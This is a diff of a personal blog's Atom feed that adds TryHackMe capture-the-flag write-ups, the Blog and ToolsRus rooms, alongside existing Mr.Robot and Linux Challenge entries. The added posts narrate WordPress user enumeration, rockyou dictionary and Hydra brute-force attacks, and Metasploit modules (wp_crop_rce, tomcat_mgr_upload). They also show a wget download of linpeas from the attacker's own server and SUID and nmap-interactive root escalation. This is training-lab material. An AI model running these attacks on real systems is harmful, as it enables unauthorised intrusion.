@@ -1,7 +1,131 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-15T16:30:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ErrorCauser’s Write-Up’s</title><author><name>ErrorCauser</name></author><entry><title type="html">TryHackMe | Linux Challenge - Walktrough</title><link href="http://localhost:4000/Linux-Challenge/" rel="alternate" type="text/html" title="TryHackMe | Linux Challenge - Walktrough" /><published>2020-07-15T00:00:00+02:00</published><updated>2020-07-15T00:00:00+02:00</updated><id>http://localhost:4000/Linux-Challenge</id><content type="html" xml:base="http://localhost:4000/Linux-Challenge/">&lt;p&gt;&lt;img src=&quot;https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fhdqwalls.com%2Fwallpapers%2Flinux-tux-minimalism-4k-42.jpg&amp;amp;f=1&amp;amp;nofb=1&quot; alt=&quot;linuxlogo&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-16T17:58:14+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ErrorCauser’s Write-Up’s</title><author><name>ErrorCauser</name></author><entry><title type="html">TryHackMe | Blog CTF</title><link href="http://localhost:4000/Blog/" rel="alternate" type="text/html" title="TryHackMe | Blog CTF" /><published>2020-07-16T00:00:00+02:00</published><updated>2020-07-16T00:00:00+02:00</updated><id>http://localhost:4000/Blog</id><content type="html" xml:base="http://localhost:4000/Blog/">&lt;p&gt;&lt;img src=&quot;http://growtowinmarketing.com/wp-content/uploads/2015/06/How-To-Write-a-WordPress-Post-7.png&quot; alt=&quot;wordpress-logo&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Hello Guys!
-Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com
+&lt;p&gt;Hello Guys!&lt;/p&gt;
+
+&lt;p&gt;In this Post we will discuss the Blog CTF on TryHackMe.
+At this point its a new Room (5 Days old).
+In order to get the blog to work with AWS, you’ll need to add blog.thm 
+to your /etc/hosts file.&lt;/p&gt;
+
+&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/blog&quot;&gt;Blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Difficulty: Medium&lt;/p&gt;
+
+&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/Nameless0ne&quot;&gt;Nameless0ne&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;As always, I started by Enumerating the System.&lt;/p&gt;
+
+&lt;p&gt;Nmap gor me the following Results:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733283213937606666/unknown.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Afterwards I ran enum4linux and Gobuster with the popular common.txt Wordlist.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733284680522137750/unknown.png&quot; alt=&quot;gobuster&quot; /&gt;
+&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733284876538740777/unknown.png&quot; alt=&quot;enum4linux&quot; /&gt;
+&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733285029433835520/unknown.png&quot; alt=&quot;enum4linux-nbt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the Actual Site, we can also see two Names which we could use to Bruteforce a Password:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733289155953688636/unknown.png&quot; alt=&quot;names&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used all Usernames I got up until that point, and made a custom Username-List. I simply changed the formats
+from Names to usernames, for example:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bob johnson -&amp;gt; bob.johnson -&amp;gt; johnson.bob -&amp;gt; bob-johnson -&amp;gt; bob-johnson123 ...&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats what you could do on another Site. Since we got a Wordpress Site, we can use a Tool called &lt;strong&gt;wpsscan&lt;/strong&gt; to 
+Enumerate Users and Dictionary Attack their Password with rockyou.txt.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] bjoel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As I said before, from here you can use the Tool with the two found Usernames to Dicitonary attack the&lt;/p&gt;
+
+&lt;p&gt;two Users.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733316945226760292/unknown.png&quot; alt=&quot;attackingusers&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After getting the Password for one of the Users, you will get Access to the Panel. You have no rights&lt;/p&gt;
+
+&lt;p&gt;to actually Post anything. We need to PrivEsc.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733317602692300830/unknown.png&quot; alt=&quot;panel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since this is a outdated WordPress Version, I found a &lt;a href=&quot;https://www.exploit-db.com/exploits/46662&quot;&gt;Exploit&lt;/a&gt; for it.&lt;/p&gt;
+
+&lt;p&gt;It has its own Metasploit Module in &lt;strong&gt;exploit/multi/http/wp_crop_rce&lt;/strong&gt;. As the Name says, its a RCE Exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733319786632708184/unknown.png&quot; alt=&quot;msfmodul&quot; /&gt;
+&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733320446182817832/unknown.png&quot; alt=&quot;meterpreter&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, we gained a Meterpreter Session. We are currently &lt;strong&gt;www-data&lt;/strong&gt;. We have to PrivEsc again.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733322172495298590/unknown.png&quot; alt=&quot;www-data&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I opened a Shell to navigate faster. I had to spawn the Bash Shell with the following Command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733323150846066768/unknown.png&quot; alt=&quot;shelldrop&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The actual User Flag in /home/bjoe1 turns out to be a Fake User Flag.&lt;/p&gt;
+
+&lt;p&gt;In order to PrivEsc the right way, I uploaded linpeas onto the System. I created a Python Web Server&lt;/p&gt;
+
+&lt;p&gt;on my local Machine with the Command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server [PORT]&lt;/code&gt;. The Webserver needs to be initialized
+in the Folder, the File(s) you want to Download are stored. Afterwards I ran the Command
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget http://{IP}:{PORT}/linpeas.sh&lt;/code&gt; to Download the File. Make sure to be in a Direvtory where you are
+able to Execute, /tmp is always a good one. Dont forget to give the File execute Perms.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733328427846992012/unknown.png&quot; alt=&quot;linpease&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Linpease gave us the following SUID PriEsc Methods:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733333551696707656/unknown.png&quot; alt=&quot;privesclin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I additionally ran the following Command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find -perm -400 -ls 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733340159277531196/unknown.png&quot; alt=&quot;dev&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So as we can see, there is a weird “checker” Programm. After some basic Reverse Engeneering, I saw that I could
+get Admin (UID 0) by setting up a new enviroment Variable.&lt;/p&gt;
+
+&lt;p&gt;Ebviroment Variables are Variable which can be used everywhere, they simply store a string. The Program requires you
+to have such a Variable “admin”.&lt;/p&gt;
+
+&lt;p&gt;To create a new one you will have to aplly the following Command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export admin=admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Afterwards you will be able to run the Script again and gain Root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733349192449261628/unknown.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Credits go out to &lt;a href=&quot;https://tryhackme.com/p/power&quot;&gt;Power&lt;/a&gt;. He is part of the &lt;a href=&quot;https://discord.gg/RgBGcvz&quot;&gt;BayByte Team &lt;/a&gt; and helped 
+me out with the PrivEsc!&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! In this Post we will discuss the Blog CTF on TryHackMe. At this point its a new Room (5 Days old). In order to get the blog to work with AWS, you’ll need to add blog.thm to your /etc/hosts file. URL: Blog Difficulty: Medium Author: Nameless0ne</summary></entry><entry><title type="html">TryHackMe | Linux Challenge - Walktrough</title><link href="http://localhost:4000/Linux-Challenge/" rel="alternate" type="text/html" title="TryHackMe | Linux Challenge - Walktrough" /><published>2020-07-15T00:00:00+02:00</published><updated>2020-07-15T00:00:00+02:00</updated><id>http://localhost:4000/Linux-Challenge</id><content type="html" xml:base="http://localhost:4000/Linux-Challenge/">&lt;p&gt;&lt;img src=&quot;https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fhdqwalls.com%2Fwallpapers%2Flinux-tux-minimalism-4k-42.jpg&amp;amp;f=1&amp;amp;nofb=1&quot; alt=&quot;linuxlogo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hello Guys!&lt;/p&gt;
+
+&lt;p&gt;Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com
 This rooms purpose is to learn or improve your Linux skills.&lt;/p&gt;
 
 &lt;p&gt;There will be challenges that will involve you using the following commands and techniques:&lt;/p&gt;
@@ -369,10 +493,87 @@ $ cat flag29_noSN
 
 &lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732967072728088736/unknown.png&quot; alt=&quot;flag36&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 83d233f2ffa388e5f0b053848caed1eb&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com This rooms purpose is to learn or improve your Linux skills. There will be challenges that will involve you using the following commands and techniques: Using commands such as: ls, grep, cd, tail, head, curl, strings, tmux, find, locate, diff, tar, xxd Understanding cronjobs, MOTD's and system mounts SSH'ing to other users accounts using a password and private key Locating files on the system hidden in different directories Encoding methods (base64, hex) MySQL database interaction Using SCP to download a file Understanding Linux system paths and system variables Understanding file permissions Using RDP for a GUI URL: Linux Challenge Difficulty: Very Easy Author: Ben Task 2-1: Garry’s Home Directory The first Task is to SSH into Garry’s System. We already got the SSH Credentials. In this Case the Command would be the following: As we can see, there are a Total of 3 Files in his Home Directory.</summary></entry><entry><title type="html">TryHackMe | Anonymous CTF</title><link href="http://localhost:4000/Anonymous/" rel="alternate" type="text/html" title="TryHackMe | Anonymous CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Anonymous</id><content type="html" xml:base="http://localhost:4000/Anonymous/">&lt;p&gt;&lt;img src=&quot;http://hdwallpaperfun.com/wp-content/uploads/2014/12/Anonymous-Mask-Space-Wallpaper-Widescreen-45480.jpg&quot; alt=&quot;anonymous&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html"></summary></entry><entry><title type="html">TryHackMe | Mr.Robot CTF</title><link href="http://localhost:4000/Mr.Robot/" rel="alternate" type="text/html" title="TryHackMe | Mr.Robot CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Mr.Robot</id><content type="html" xml:base="http://localhost:4000/Mr.Robot/">&lt;p&gt;&lt;img src=&quot;https://www.hdwallpapers.in/walls/mr_robot_hd_4k_8k-HD.jpg&quot; alt=&quot;mr-robot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 83d233f2ffa388e5f0b053848caed1eb&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com This rooms purpose is to learn or improve your Linux skills. There will be challenges that will involve you using the following commands and techniques: Using commands such as: ls, grep, cd, tail, head, curl, strings, tmux, find, locate, diff, tar, xxd Understanding cronjobs, MOTD's and system mounts SSH'ing to other users accounts using a password and private key Locating files on the system hidden in different directories Encoding methods (base64, hex) MySQL database interaction Using SCP to download a file Understanding Linux system paths and system variables Understanding file permissions Using RDP for a GUI URL: Linux Challenge Difficulty: Very Easy Author: Ben Task 2-1: Garry’s Home Directory The first Task is to SSH into Garry’s System. We already got the SSH Credentials. In this Case the Command would be the following: As we can see, there are a Total of 3 Files in his Home Directory.</summary></entry><entry><title type="html">TryHackMe | ToolsRus CTF</title><link href="http://localhost:4000/ToolsRus/" rel="alternate" type="text/html" title="TryHackMe | ToolsRus CTF" /><published>2020-07-15T00:00:00+02:00</published><updated>2020-07-15T00:00:00+02:00</updated><id>http://localhost:4000/ToolsRus</id><content type="html" xml:base="http://localhost:4000/ToolsRus/">&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Toys_%22R%22_Us_logo.svg/1280px-Toys_%22R%22_Us_logo.svg.png&quot; alt=&quot;toolsrus&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Hello Guys!
-Today we will discuss the Mr.Robot CTF on TryHackMe.com
+&lt;p&gt;Hello Guys!&lt;/p&gt;
+
+&lt;p&gt;In this Post I am going to share my ToolsRus CTF experience with you.
+Your challenge is to use the tools listed below to enumerate a server, gathering information along 
+the way that will eventually lead to you taking over the machine.
+This CTF Requires the following Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dirbuster&lt;/li&gt;
+  &lt;li&gt;Hydra&lt;/li&gt;
+  &lt;li&gt;Nmap&lt;/li&gt;
+  &lt;li&gt;Nikto&lt;/li&gt;
+  &lt;li&gt;Metasploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/toolsrus&quot;&gt;ToolsRus CTF&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Difficulty: Easy&lt;/p&gt;
+
+&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/tryhackme&quot;&gt;TryHackMe&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;First of all we will Enumerate the Machine.&lt;/p&gt;
+
+&lt;p&gt;I started with a Nmap Scan followed by a Gobuster Scan on Port 80 with the famous common.txt Wordlits.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733051608207982602/unknown.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733052056235147354/unknown.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once I navigated into the &lt;strong&gt;/guidelines&lt;/strong&gt; Directory, I found a potential Username &lt;strong&gt;Bob&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733055470977286254/unknown.png&quot; alt=&quot;guidelines&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The Port 1234 is open. It is running Apache Tomcat/7.0.88.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733056110038089774/unknown.png&quot; alt=&quot;tomcat&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here are the Results of Gobsuter on Port 1234:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733056974241005689/unknown.png&quot; alt=&quot;gobuster2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next thing I did was a Bruteforce attack with rockyou on the &lt;strong&gt;/protected&lt;/strong&gt; Direction, since it requires a Password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733058590042226768/unknown.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In order to crack the Passoword I used Hydra with the following Command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ hydra -l bob -P {YOUR WORDLIST} -f {MACHINE_IP} http-get /protected/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733059086408482846/unknown.png&quot; alt=&quot;hydra&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we got into the Site, we got a Picture saying “This Protected Page has now moved to a different Port”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733059536910417920/unknown.png&quot; alt=&quot;protected&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I ran Nikto against Port &lt;strong&gt;1234&lt;/strong&gt; afterwards to find our new loginpage.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733074665584459846/unknown.png&quot; alt=&quot;nikto&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to login to the &lt;strong&gt;Tomcat Manager&lt;/strong&gt; on Port 1234 with the same Credentials. It worked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733060078973878302/unknown.png&quot; alt=&quot;tomcatmanager&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As a Manager we have the ability to Upload a &lt;strong&gt;WAR&lt;/strong&gt; File. You could created a WAR File with a Linux Payload and upload it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733062009540706444/unknown.png&quot; alt=&quot;upload-tomcat&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As it turns out, this Tomcat Server is very outdated and vulnerable. I found a Metasploit Module to ecploit the Manager on Port 1234.
+The Module is called &lt;strong&gt;exploit/multi/http/tomcat_mgr_upload&lt;/strong&gt;. It spwans a Meterpreter Session.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733076590526857317/unknown.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get the Shell as the Root User. The next thing I did was getting the Root Flag, which is stored in &lt;strong&gt;/root/flag.txt&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733077167277211678/unknown.png&quot; alt=&quot;rootflag&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! In this Post I am going to share my ToolsRus CTF experience with you. Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine. This CTF Requires the following Tools: Dirbuster Hydra Nmap Nikto Metasploit</summary></entry><entry><title type="html">TryHackMe | Anonymous CTF</title><link href="http://localhost:4000/Anonymous/" rel="alternate" type="text/html" title="TryHackMe | Anonymous CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Anonymous</id><content type="html" xml:base="http://localhost:4000/Anonymous/">&lt;p&gt;&lt;img src=&quot;http://hdwallpaperfun.com/wp-content/uploads/2014/12/Anonymous-Mask-Space-Wallpaper-Widescreen-45480.jpg&quot; alt=&quot;anonymous&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html"></summary></entry><entry><title type="html">TryHackMe | Mr.Robot CTF</title><link href="http://localhost:4000/Mr.Robot/" rel="alternate" type="text/html" title="TryHackMe | Mr.Robot CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Mr.Robot</id><content type="html" xml:base="http://localhost:4000/Mr.Robot/">&lt;p&gt;&lt;img src=&quot;https://www.hdwallpapers.in/walls/mr_robot_hd_4k_8k-HD.jpg&quot; alt=&quot;mr-robot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hello Guys!&lt;/p&gt;
+
+&lt;p&gt;Today we will discuss the Mr.Robot CTF on TryHackMe.com
 The Room was Simple and Fun. It contained a Wordpress Website, the Goal was to Root the System.&lt;/p&gt;
 
 &lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/mrrobot&quot;&gt;Mr Robot CTF&lt;/a&gt;&lt;/p&gt;
@@ -429,10 +630,11 @@ I imported Python and spawned the Bash Shell with the following Command:&lt;/p&g
 
 &lt;p&gt;To obtain the 3rd and last Flag, I had to get Root Privilleges. I used the Command &lt;strong&gt;nmap –interactive&lt;/strong&gt; followed by &lt;strong&gt;!sh&lt;/strong&gt; to obtain a Root Shell.
 I could easily navigate to /root and get the last Key. 
-&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732681441464418419/unknown.png&quot; alt=&quot;3rdkey&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Mr.Robot CTF on TryHackMe.com The Room was Simple and Fun. It contained a Wordpress Website, the Goal was to Root the System. URL: Mr Robot CTF Difficulty: Easy Author: Ben</summary></entry><entry><title type="html">TryHackMe | Pickle Rick CTF</title><link href="http://localhost:4000/PickleRick/" rel="alternate" type="text/html" title="TryHackMe | Pickle Rick CTF" /><published>2020-07-13T00:00:00+02:00</published><updated>2020-07-13T00:00:00+02:00</updated><id>http://localhost:4000/PickleRick</id><content type="html" xml:base="http://localhost:4000/PickleRick/">&lt;p&gt;&lt;img src=&quot;https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fmocah.org%2Fuploads%2Fposts%2F5000326-rick-and-morty-tv-shows-hd-4k-illustration-behance-artist-artwork-digital-art.jpg&amp;amp;f=1&amp;amp;nofb=1&quot; alt=&quot;Rick-and-Morty&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732681441464418419/unknown.png&quot; alt=&quot;3rdkey&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Mr.Robot CTF on TryHackMe.com The Room was Simple and Fun. It contained a Wordpress Website, the Goal was to Root the System. URL: Mr Robot CTF Difficulty: Easy Author: Ben</summary></entry><entry><title type="html">TryHackMe | Pickle Rick CTF</title><link href="http://localhost:4000/PickleRick/" rel="alternate" type="text/html" title="TryHackMe | Pickle Rick CTF" /><published>2020-07-13T00:00:00+02:00</published><updated>2020-07-13T00:00:00+02:00</updated><id>http://localhost:4000/PickleRick</id><content type="html" xml:base="http://localhost:4000/PickleRick/">&lt;p&gt;&lt;img src=&quot;https://hdqwalls.com/wallpapers/rick-and-morty-in-another-dimension-illustration-6c.jpg&quot; alt=&quot;Rick-and-Morty&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Hello Guys!
-Today we are doing the Pickle Rick CTF on TryHackMe.com.
+&lt;p&gt;Hello Guys!&lt;/p&gt;
+
+&lt;p&gt;Today we are doing the Pickle Rick CTF on TryHackMe.com.
 This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.&lt;/p&gt;
 
 &lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;Pickle-Rick&lt;/a&gt;&lt;/p&gt;
